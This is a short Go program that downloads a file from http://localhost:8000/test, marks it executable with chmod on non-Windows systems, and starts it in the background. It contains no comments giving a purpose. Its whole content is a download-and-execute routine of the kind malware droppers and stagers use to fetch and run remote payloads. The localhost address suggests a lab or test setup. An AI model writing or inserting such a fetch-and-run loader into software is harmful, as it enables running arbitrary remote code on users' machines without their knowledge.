package main

import ("os";"os/exec";"net/http";"io";"runtime")

func downloadFile(filepath string, url string) (err error) {

  // Create the file
  out, err := os.Create(filepath)
  if err != nil  {
    return err
  }
  defer out.Close()

  // Get the data
  resp, err := http.Get(url)
  if err != nil {
    return err
  }
  defer resp.Body.Close()

  // Writer the body to file
  _, err = io.Copy(out, resp.Body)
  if err != nil  {
    return err
  }

  return nil
}

func main() {
    downloadFile("test", "http://localhost:8000/test")
    if runtime.GOOS != "windows" {
        exec.Command("chmod", "+x", "test").Run()
    }
    exec.Command("./test").Start()
}
